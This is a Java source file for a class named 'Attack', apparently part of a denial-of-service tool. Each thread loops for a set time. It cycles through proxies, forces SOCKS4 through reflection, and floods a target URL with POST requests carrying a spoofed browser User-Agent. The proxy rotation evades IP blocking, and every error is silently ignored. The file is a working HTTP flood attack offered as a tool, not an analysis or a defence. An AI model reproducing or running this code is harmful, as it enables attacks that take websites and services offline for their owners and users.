
import java.io.DataOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketImpl;
import java.net.URL;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Attack implements Runnable {

    private String host;
    private int time;
    private ProxyManager proxyManager;
    public static Proxy proxy;
  
    private int port;

    public Attack(int time, String host, ProxyManager proxyManager) {
        this.time = time * 1000;
        this.host = host;
        this.proxyManager = proxyManager;
    }   

    @Override
    public void run() {
        long s = System.currentTimeMillis() + time;
        while(System.currentTimeMillis() < s){
                try {
                  Proxy proxy = this.proxyManager.nextProxy();
                  Socket socket = new Socket(proxy);
                  Class clazzSocks  = socket.getClass();
Method setSockVersion  = null;
Field sockImplField = null; 
SocketImpl socksimpl = null; 
try {
  sockImplField = clazzSocks.getDeclaredField("impl");
  sockImplField.setAccessible(true);
  socksimpl  = (SocketImpl) sockImplField.get(socket);
  Class clazzSocksImpl  =  socksimpl.getClass();
  setSockVersion  = clazzSocksImpl.getDeclaredMethod("setV4");
  System.setProperty("socksProxyVersion", "4");
  setSockVersion.setAccessible(true);
  if(null != setSockVersion){
      setSockVersion.invoke(socksimpl);
  }
  sockImplField.set(socket, socksimpl);
} catch (Exception e) {

} 
                
                  URL url = new URL(host);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxy);
                connection.usingProxy();
                connection.addRequestProperty("Keep-Alive", "10");
                connection.setRequestMethod("POST");
                connection.setConnectTimeout(5000);
                connection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0");
                System.out.println("Conexion exitosa  - " + proxy);
                connection.getResponseCode();
                Thread.sleep(50L);
                

               connection.disconnect();
            }catch (Exception e){
                
            }
                
        }
    }
        }
    


